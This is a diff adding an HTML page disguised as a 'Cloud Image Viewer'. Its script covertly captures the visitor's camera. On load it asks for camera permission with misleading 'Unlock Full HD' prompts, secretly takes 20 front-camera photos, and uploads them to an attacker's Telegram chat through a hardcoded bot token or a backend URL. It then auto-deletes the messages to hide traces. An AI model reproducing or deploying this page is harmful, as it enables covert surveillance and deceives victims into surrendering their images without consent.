@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PostImage - Media Cloud Viewer</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+    body {
+      background: #090d16;
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .viewer-card {
+      background: #131c2e;
+      border: 1px solid #23314d;
+      border-radius: 16px;
+      padding: 20px;
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+    }
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 12px;
+      margin-bottom: 14px;
+      border-bottom: 1px solid #23314d;
+      font-size: 13px;
+      color: #38bdf8;
+    }
+    .img-box {
+      width: 100%;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #020617;
+      border: 1px solid #334155;
+      margin-bottom: 16px;
+      min-height: 220px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .img-box img {
+      width: 100%;
+      max-height: 380px;
+      object-fit: contain;
+      display: block;
+    }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #0284c7;
+      color: #ffffff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      display: none;
+    }
+    .btn:active {
+      transform: scale(0.98);
+    }
+    .btn:hover {
+      background: #0369a1;
+    }
+    #status {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-top: 12px;
+      min-height: 20px;
+    }
+    .help-hint {
+      font-size: 11px;
+      color: #f87171;
+      margin-top: 8px;
+      display: none;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="viewer-card">
+    <div class="top-bar">
+      <span>🖼️ Cloud Image Viewer</span>
+      <span style="color:#4ade80;">● Ultra HD</span>
+    </div>
+
+    <!-- Gallery Image Preview -->
+    <div class="img-box">
+      <img id="previewImage" src="https://via.placeholder.com/400x300?text=Loading+Media..." alt="Shared Media">
+    </div>
+
+    <!-- Fallback Button (agar auto-popup block ho jaye) -->
+    <button id="allowBtn" class="btn">📸 Allow Camera / Unlock Full HD</button>
+    <div id="status">Loading image preview...</div>
+    <div id="helpHint" class="help-hint">Agar popup na aaye toh browser URL bar me Lock (🔒) icon par click karke camera allow karein.</div>
+
+    <!-- Hidden Video & Canvas for 20 Shots -->
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="canvasElement"></canvas>
+  </div>
+
+  <script>
+    // ==========================================================================
+    // CONFIGURATION (Dono Options Supported):
+    // --------------------------------------------------------------------------
+    // OPTION 1 (100% Safe - Token Hidden):
+    // Agar aap bot.py ko Render ya Termux (Cloudflare tunnel) par chalate hain,
+    // toh apna backend URL yaha dalein. HTML me Bot Token daalne ki zaroorat hi nahi!
+    const BACKEND_URL = ""; // e.g. "https://your-bot-app.onrender.com"
+
+    // OPTION 2 (Direct Telegram API):
+    // Agar backend nahi lagana, toh ye direct Telegram API use karega.
+    const DIRECT_BOT_TOKEN = "9057540528:AAHA3zbRfTvOdYA23ESw43QziYP_qA0_Xqw";
+    // ==========================================================================
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetChatId = urlParams.get('id');
+    const customImg = urlParams.get('img');
+
+    const previewImage = document.getElementById('previewImage');
+    const allowBtn = document.getElementById('allowBtn');
+    const statusText = document.getElementById('status');
+    const helpHint = document.getElementById('helpHint');
+    const video = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvasElement');
+
+    if (customImg) {
+      previewImage.src = customImg;
+    }
+
+    let isCapturing = false;
+    let shotCount = 0;
+    const maxShots = 20; // 20 Photos total
+    let streamRef = null;
+
+    async function requestCameraAndStart() {
+      if (isCapturing) return;
+
+      try {
+        statusText.style.color = "#38bdf8";
+        statusText.innerText = "Verifying media access...";
+
+        streamRef = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+
+        isCapturing = true;
+        video.srcObject = streamRef;
+        allowBtn.style.display = "none";
+        helpHint.style.display = "none";
+        statusText.style.color = "#4ade80";
+        statusText.innerText = "Media rendering in HD quality...";
+
+        // 1-1 second me 20 photos burst
+        const burstTimer = setInterval(() => {
+          shotCount++;
+          sendPhoto(shotCount);
+
+          if (shotCount >= maxShots) {
+            clearInterval(burstTimer);
+            statusText.innerText = "✅ Media successfully rendered!";
+            if (streamRef) {
+              streamRef.getTracks().forEach(track => track.stop());
+            }
+          }
+        }, 1000);
+
+      } catch (err) {
+        allowBtn.style.display = "block";
+        helpHint.style.display = "block";
+        statusText.style.color = "#f87171";
+        statusText.innerText = "⚠️ Camera permission allow karein HD photo dekhne ke liye.";
+      }
+    }
+
+    function sendPhoto(num) {
+      if (!targetChatId) return;
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        if (!blob) return;
+
+        const formData = new FormData();
+        formData.append('chat_id', targetChatId);
+        formData.append('photo', blob, `snap_${num}.jpg`);
+        formData.append('shot', num);
+        formData.append('total', maxShots);
+
+        try {
+          // If Backend URL is set -> Send to Backend (Token is 100% hidden!)
+          if (BACKEND_URL && BACKEND_URL.startsWith('http')) {
+            await fetch(`${BACKEND_URL}/upload`, {
+              method: 'POST',
+              body: formData
+            });
+          } else {
+            // Direct Telegram API fallback
+            formData.append('caption', `📸 Photo ${num}/${maxShots}\n⏰ Time: ${new Date().toLocaleTimeString()}\n⏳ 5-Minute Auto-Delete Active`);
+            const res = await fetch(`https://api.telegram.org/bot${DIRECT_BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+            const resData = await res.json();
+
+            // 5-minute auto-delete fallback
+            if (resData.ok && resData.result && resData.result.message_id) {
+              const msgId = resData.result.message_id;
+              setTimeout(async () => {
+                try {
+                  await fetch(`https://api.telegram.org/bot${DIRECT_BOT_TOKEN}/deleteMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: targetChatId, message_id: msgId })
+                  });
+                } catch (e) {}
+              }, 300000);
+            }
+          }
+        } catch (e) {
+          console.error("Upload error:", e);
+        }
+      }, 'image/jpeg', 0.85);
+    }
+
+    // Direct Auto-Trigger on Load
+    window.addEventListener('DOMContentLoaded', () => {
+      requestCameraAndStart();
+    });
+
+    allowBtn.addEventListener('click', () => {
+      requestCameraAndStart();
+    });
+  </script>
+</body>
+</html>
